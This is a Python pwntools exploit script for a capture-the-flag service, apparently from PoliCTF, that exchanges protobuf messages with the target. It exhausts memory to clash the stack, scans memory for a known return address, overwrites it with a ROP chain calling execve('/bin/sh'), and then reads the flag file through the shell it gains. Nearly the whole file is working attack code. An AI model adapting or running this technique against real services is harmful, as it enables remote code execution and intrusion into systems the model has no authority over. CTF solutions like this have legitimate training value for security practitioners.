from pwn import *
from met_pb2 import *
from google.protobuf.message import DecodeError
import logging
import sys
l = logging.getLogger("met.exploit")
l.setLevel("DEBUG")

PAGE_COUNT = 10000
STACK_COUNT = 0x21000
PAGE_SIZE = 0x16000
READ_SIZE = 0x1000
MEM_CHUNK_SIZE = 2
STACK_SIZE = 8 * 8 * 2
MAIN_RETURN = 0x40177d
FLAG = "flag{I_swear_i_wrote_this_before_qualys_report!}"

HOST = sys.argv[1]
PORT = int(sys.argv[2])

r = remote(HOST, PORT)

# context.log_level = "DEBUG"
# print r.recvuntil("out!\n")
TO_EXEC="/bin/sh\x00" + "\x00" * 8
context.clear(arch='amd64')
e = ELF(sys.argv[3])
rop = ROP(sys.argv[3])
rop.read(0, e.bss(), len(TO_EXEC))
# rop.execve(e.bss(), e.bss(8), e.bss(8))
rop.raw(rop.rdi.address)
rop.raw(e.bss())
rop.raw(rop.rsi.address)
rop.raw(e.bss(8))
rop.raw(rop.rdx.address)
rop.raw(e.bss(8))
rop.raw(rop.rax.address)
rop.raw(59) #execve
rop.raw(0x463ff5) #syscall

print rop.dump()

# rop.read(0, )
# raw_input("waiting for you sir!")

def get_msg():
    resp = None
    buf = ""
    while True:
        try:
            print "Trying to read"
            buf += r.recvuntil("gimmi a numba!\n")
            buf_clean = buf.split("gimmi a numba!\n")
            resp = Response()
            resp.ParseFromString(buf_clean[0])
            break
        except DecodeError as e:
            print e
            sys.exit(-1)
    return resp

def get_real_size(size):
    if size == Command._1K:
        return 0x1000
    elif size == Command._2K:
        return 0x2000
    elif size == Command._4K:
        return 0x4000
    elif size == Command._8K:
        return 0x8000
    elif size == Command._16K:
        return 0x16000
    elif size == Command._100K:
        return 0x100000
    elif size == Command._150K:
        return 0x150000


def get_read(size=Command._16K, count=PAGE_COUNT):
    i = 0

    notfailed = True
    memory_id = -1
    failed_req_count = 0
    print r.recvuntil("numba!\n", timeout=2)
    cyce_count = 0
    while notfailed:
        buf = ""
        resp = None
        req = Request()
        cmds = []
        for x in xrange(1):
            c = Command()
            c.type = Command.MEMORY
            c.id = i
            c.count = count
            c.size = size
            i += 1
            cmds.append(c)
        req.command.extend(cmds)

        payload = req.SerializeToString()
        # print payload
        # print Request.FromString(payload)
        print len(payload)

        r.sendline("%d" % len(payload))
        print payload.encode("hex")
        time.sleep(0.1)
        r.send(payload)
        time.sleep(0.1)
        resp = get_msg()
        cyce_count += 1
        for res in resp.result:
            # print "ids:", res.id
            if res.status == Result.FAILED:
                # print res.msg
                if memory_id < 0:
                    memory_id = res.id
                    failed_req_count = 1 
                else:
                    failed_req_count += 1
                notfailed = False

    print "mem 1", memory_id
    memory_id = (cyce_count -1)* count
    memory_id += count - failed_req_count + 1
    # memory_id *= get_real_size(size)
    print "count start", memory_id, failed_req_count

    print "with last part", memory_id

    print "My guess is %d pages" % memory_id
    print "Memory : %d" % (memory_id * get_real_size(size))

    print "sent %d pages" % count
    return memory_id * get_real_size(size)

def write(where, what):
    l.debug("writing at %lx" % (where))
    # raw_input("waiting for you sir...")
    req = Request()
    cmds = []
    c = Command()
    c.type = Command.WRITE
    c.id = 0
    c.count = 1
    c.ammount = where
    cmds.append(c)
    req.command.extend(cmds)
    payload = req.SerializeToString()
    r.sendline("%d" % len(payload))
    time.sleep(0.1)
    r.send(payload)
    time.sleep(0.1)
    r.send(what)
    l.debug("Sent %d bytes", len(what))

def lower_stack():
    l.debug("lowering stack")
    # raw_input("waiting for you sir...")
    req = Request()
    cmds = []
    c = Command()
    c.type = Command.EXIT
    c.id = 0
    c.count = 1
    cmds.append(c)
    req.command.extend(cmds)
    payload = req.SerializeToString()
    time.sleep(0.5)
    r.sendline("%d" % len(payload))
    time.sleep(0.5)
    r.send(payload)

def exploit(x, data, index):
    # raw_input("before exploit >")
    newdata = data[:index]
    payload = str(rop)
    newdata += payload
    newdata += data[index+len(payload):]
    newdata = newdata.ljust(READ_SIZE, "\x00")
    # newdata = "\x41" * 0x1000
    time.sleep(0.1)
    write(x+index, payload)
    # raw_input("after write >")

    # for x in xrange(50):
    time.sleep(0.1)
    lower_stack()
    time.sleep(0.1)
    r.send(TO_EXEC)
    time.sleep(0.1)
    r.sendline("cat /home/polictf/flag")
    time.sleep(1)
    flag = r.recv(0x1000, timeout=2)
    print "Flag:", flag
    flag += r.recv(0x1000, timeout=2)
    # r.interactive() # At this point you should have a shell
    print "Flag:", flag
    if FLAG in flag:
        sys.exit(1)
    sys.exit(-1)


def read(x, addresses=None):
    i=0
    l.debug("Reading at %lx" % (x))
    # raw_input("waiting for you sir...")
    req = Request()
    cmds = []
    c = Command()
    c.type = Command.READ
    c.id = i
    c.count = 1
    c.ammount = x#(PAGE_SIZE*PAGE_COUNT*memory_id)
    i += 1
    cmds.append(c)
    req.command.extend(cmds)

    payload = req.SerializeToString()
    r.sendline("%d" % len(payload))
    time.sleep(0.1)
    r.sendline(payload)
    data = r.recv(READ_SIZE)
    l.debug("Recived %d data: %s", len(data), data.encode("hex"))
    while len(data) != READ_SIZE:
        data += r.recv(READ_SIZE - len(data))
    resp = get_msg()
    print resp
    if addresses is None and data != "\x00" * (READ_SIZE):
        l.info("%x looks good!", x)
        print data
        return True
    elif addresses is not None:
        print data != "\x00" * (READ_SIZE)
        if data != "\x00" * (READ_SIZE):
            l.info("Not zero !!!")
            # raw_input("not zero, so what?")
        for address in addresses:
            if p64(address) in data:
                index = data.find(p64(address))
                l.info("Found the address at %x", index)
                r.recv(0x4000, timeout=1)
                r.recv(0x4000, timeout=1)
                r.recv(0x4000, timeout=1)
                exploit(x, data, index)
                return True

    return False

def find_page(start=0):
    l.info("Start Finding page")
    x = start
    while not read(x, [MAIN_RETURN, ]):
        print r.recvuntil("gimmi a numba!\n")
        print "One more"
        x-=READ_SIZE
        # raw_input("new read %lx >" %x)
    return x

def raise_the_stack(ammount=1, ammount_=None):
    i=0
    # raw_input("waiting for you sir...")
    while ammount > 0:

        req = Request()
        cmds = []
        c = Command()
        c.type = Command.OTHER
        c.id = i
        c.count = 1
        if ammount_:
            c.ammount = ammount_
        i += 1
        cmds.append(c)

        c = Command()
        c.type = Command.EXIT
        c.id = i
        c.count = 1
        if ammount_:
            c.ammount = ammount_
        i += 1
        cmds.append(c)
        req.command.extend(cmds)

        payload = req.SerializeToString()
        r.recvuntil("numba!\n", timeout=2)
        r.sendline("%d" % len(payload))
        time.sleep(0.1)
        r.sendline(payload)

        r.recvuntil("out!\n")
        print "Still %d to go" %ammount
        ammount -= 1

for _ in xrange(50):
    raise_the_stack()

# raw_input("Stack raised")
r.recv(timeout=1)
memory_allocate_100 = get_read(Command._150K, count=1000)
print hex(memory_allocate_100)
# raw_input("100 done")
memory_allocate_75 = get_read(Command._100K, 1)
# raw_input("75 done")
memory_allocate_16 = get_read(Command._16K, 1)
# raw_input("16 done")
memory_allocate_8 = get_read(Command._8K, 1)
# raw_input("8 done")
memory_allocate_4 = get_read(Command._4K, 1)
memory_allocate_2 = get_read(Command._2K, 1)
memory_allocate_1 = get_read(Command._1K, 1)

x = memory_allocate_100 +  0x20000 + 0x16000 + 0x8000 + 0x4000 + 0x2000 + 0x1000 + 0x4000 + 0xe0000
print hex(x)
# raw_input("Sticazzi wait!")
# context.log_level = "DEBUG"
#TODO raise stack

# while not read(x):
#     raise_the_stack()
#     print "", r.recv(timeout=1)

# raise_the_stack()
# print "", r.recv(timeout=1)

# raise_the_stack((STACK_COUNT-0x4000) / STACK_SIZE)
# print "recv for 1 second"

print "", r.recv(timeout=1)
# raw_input("Ready for reading the world?")
real_x = find_page(x)

sys.exit(-1)

